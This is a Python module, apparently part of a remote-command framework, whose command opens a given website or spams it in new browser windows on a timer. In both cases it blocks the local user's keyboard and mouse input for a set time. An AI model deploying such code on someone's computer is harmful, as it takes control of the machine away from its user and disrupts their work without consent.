import threading
from typing import Optional
import webbrowser, time

from pydantic import BaseModel
from ..commands import Command, CommandResult, CommandArgs, ICommandModule
from ...modules.input_output.block_input import BlockInput, BlockDurationArgs

class ShowWebsiteArgs(CommandArgs):
    url: str
    blocktime: int = 0
    spamDelay: int = 10
    spam: bool = False

command_arg_map = {
    Command.SHOW_WEBSITE: ShowWebsiteArgs
}

class WebsiteSpam(ICommandModule):
    def __init__(self, block_input: BlockInput) -> None:
        self.block_input = block_input

    def _spam_website(self, url: str, spamDelay: float, blocktime: float):
        start_time = time.time()
        while time.time() - start_time < blocktime:
            webbrowser.open_new(url)
            time.sleep(spamDelay)

    def show_website(self, args: ShowWebsiteArgs) -> CommandResult:
        try:
            if not args.spam:
                webbrowser.open(args.url)
                self.block_input.block_secs(BlockDurationArgs(seconds=args.blocktime))
                return CommandResult(success=True, result="Website opened without spam.")
            else:
                t = threading.Thread(target=self._spam_website, args=(args.url, args.spamDelay, args.blocktime))
                t.start()
                self.block_input.block_secs(BlockDurationArgs(seconds=args.blocktime))
                return CommandResult(success=True, result="Website spam initiated.")
        except Exception as e:
            return CommandResult(success=False, result=f"Error: {str(e)}")

    def run(self, command: Command, args: Optional[BaseModel] = None) -> CommandResult:
        if command == Command.SHOW_WEBSITE:
            return self.show_website(ShowWebsiteArgs.model_validate(args.model_dump()))
        else:
            return CommandResult(success=False, result="Invalid command or arguments.")

        
